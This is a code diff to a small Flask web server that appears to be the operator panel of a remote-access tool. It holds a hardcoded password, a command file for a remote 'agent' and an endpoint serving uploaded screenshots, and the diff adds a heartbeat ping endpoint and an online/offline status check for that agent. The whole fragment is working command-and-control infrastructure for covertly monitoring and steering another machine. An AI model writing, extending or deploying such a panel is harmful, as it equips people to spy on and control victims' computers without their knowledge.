@@ -1,10 +1,12 @@
 from flask import Flask, request, send_file, render_template, jsonify
 import os
 import json
+from datetime import datetime
 
 app = Flask(__name__)
 PANEL_PASSWORD = "@REDXPRIME"
 COMMAND_FILE = "command.json"
+last_ping = None  # Track agent heartbeat
 
 @app.route("/")
 def dashboard():
@@ -47,6 +49,23 @@ def get_screenshot():
         return send_file("latest.jpg", mimetype='image/jpeg')
     except FileNotFoundError:
         return "❌ No screenshot uploaded yet", 404
+
+@app.route("/ping", methods=["POST"])
+def ping():
+    global last_ping
+    password = request.args.get("pass")
+    if password != PANEL_PASSWORD:
+        return "Unauthorized", 403
+    last_ping = datetime.utcnow()
+    return "Pong", 200
+
+@app.route("/status")
+def status():
+    if last_ping:
+        seconds = (datetime.utcnow() - last_ping).total_seconds()
+        if seconds < 10:
+            return jsonify({"status": "online"})
+    return jsonify({"status": "offline"})
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=10000)
